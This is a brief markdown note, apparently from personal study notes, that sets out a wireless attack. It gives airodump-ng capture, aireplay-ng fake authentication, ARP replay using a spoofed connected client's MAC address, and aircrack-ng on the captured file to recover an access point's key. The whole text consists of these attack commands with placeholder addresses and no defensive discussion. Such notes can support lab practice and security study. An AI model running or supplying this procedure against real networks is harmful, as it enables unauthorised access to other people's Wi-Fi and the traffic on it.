- - -
# Methos 1 : 

#### Run Airodump-ng On Target AP : 

```sh
airodump-ng --bssid AA:AA:AA:AA:AA:AA --channel 69 --write ska-test mon0
```

#### Do a Fakeauth : 

And this will Fail...
```sh
aireplay-ng  --fakeauth 0 -a <Target-MAC> -h <Our-MAC> mon0
```

#### Perform the ARP-replay  : 

> [!important]
> - Now You can run any "**Packet Injection**". Just replace **Our Mac address** with One of the connected **Client's MAC address**.

```sh
aireplay-ng  --arpreplay -b <Target-MAC> -h <Connected Client-MAC> mon0
```

![Imgur](https://i.imgur.com/aJAhH0O.png)

#### Now Run aircrack-ng : 

```sh
aircrack-ng ska-test-01.cap 
```

![Imgur](https://i.imgur.com/0epEcgf.png)

- - -

